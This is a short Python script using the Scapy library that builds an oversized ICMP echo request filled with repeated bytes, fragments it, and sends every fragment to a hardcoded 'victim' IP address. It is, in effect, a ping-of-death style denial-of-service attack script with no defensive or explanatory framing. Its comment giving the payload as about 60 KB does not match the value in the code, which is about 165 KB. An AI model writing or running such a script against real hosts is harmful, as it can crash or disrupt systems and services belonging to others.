from scapy.all import *

victim_ip = "10.13.23.144"  # Change this
payload = b"A" * 165507  # Large payload (~60 KB)

# Build ICMP packet
ip = IP(dst=victim_ip)
icmp = ICMP(type=8)  # Echo Request

# Scapy will fragment this automatically
pkt = ip / icmp / payload

# Send and fragment manually at layer 3 (with MTU ~1500)
frags = fragment(pkt, fragsize=1480)

for frag in frags:
    send(frag)
